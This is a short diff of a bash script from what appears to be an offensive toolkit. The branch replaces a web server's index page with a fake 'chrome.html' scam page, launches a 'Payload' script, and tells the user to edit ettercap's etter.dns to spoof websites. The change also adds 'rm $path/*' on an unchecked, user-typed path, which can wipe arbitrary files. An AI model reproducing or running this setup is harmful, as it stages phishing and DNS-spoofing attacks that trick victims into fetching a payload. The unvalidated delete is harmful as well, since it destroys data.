@@ -131,11 +131,12 @@ then
 ##----------------------------------------------------------------
 elif [ "$me1" == 1 ] 
 then
-	rm /var/www/html/index.html &>/dev/null 
-	cp Scame/chrome.html /var/www/html &>/dev/null
-	cp Scame/index.ico /var/www/html &>/dev/null
-	cp Scame/th.jpeg /var/www/html &>/dev/null
-	mv /var/www/html/chrome.html /var/www/html/index.html &>/dev/null
+	read -p "$(echo -e $BBlue"Enter your full apache server path: ")$(echo -e $BWhite"")" path
+	rm $path/* &>/dev/null 
+	cp Scame/chrome.html $path &>/dev/null
+	cp Scame/index.ico $path &>/dev/null
+	cp Scame/th.jpeg $path &>/dev/null
+	mv $path/chrome.html $path/index.html &>/dev/null
 
 	xterm -e tools/scripts/Payload
 echo "Now you can Go to /etc/ettercap/etter.dns and edit file to spoof websites."
